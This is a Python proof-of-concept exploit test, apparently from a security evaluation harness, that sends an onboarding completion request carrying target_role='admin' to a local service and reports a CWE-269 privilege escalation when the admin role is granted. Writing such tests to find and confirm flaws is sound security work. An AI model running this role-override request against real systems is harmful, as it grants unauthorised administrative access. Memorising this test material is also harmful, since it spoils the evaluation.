"""PoC: Role override via onboarding target_role parameter (CWE-269)."""
import uuid
from mosaic.oracle.exploit import ExploitTest


class RoleOverrideExploit(ExploitTest):
    """Privilege escalation: arbitrary role via onboarding completion."""

    def __init__(self, base_url: str = "http://localhost:39120"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "hasura_onboarding_role_override"

    def setup(self) -> None:
        pass

    def execute(self) -> tuple[bool, str]:
        evidence = []
        user_id = f"user_{uuid.uuid4().hex[:8]}"

        # Complete onboarding with target_role=admin
        profile = {
            "user_id": user_id,
            "name": "Test Admin",
            "bio": "Security researcher",
            "avatar": "https://example.com/avatar.png",
            "target_role": "admin",
        }

        resp = self.http_post("/v1/onboarding/complete", json=profile)
        if not resp.ok:
            resp = self.http_post("/onboarding/complete", json=profile)
        evidence.append(f"Complete onboarding: {resp.status_code}")

        if not resp.ok:
            evidence.append(f"Body: {resp.text[:200]}")
            return False, "Onboarding completion failed. " + " | ".join(evidence)

        try:
            data = resp.json()
            role = data.get("role", "")
            if not role:
                role = data.get("profile", {}).get("role", "")
            evidence.append(f"Assigned role: {role}")

            if role == "admin":
                return True, (
                    "CWE-269 Privilege escalation confirmed. "
                    "Onboarding completion accepts arbitrary target_role parameter, "
                    "allowing users to self-assign admin role. "
                    + " | ".join(evidence)
                )
            elif role and role not in ("user", ""):
                evidence.append(f"Got elevated role '{role}'")
                return True, f"CWE-269 Partial escalation — got '{role}'. " + " | ".join(evidence)
        except Exception as ex:
            evidence.append(f"Parse error: {ex}")

        return False, "Role override not exploitable. " + " | ".join(evidence)
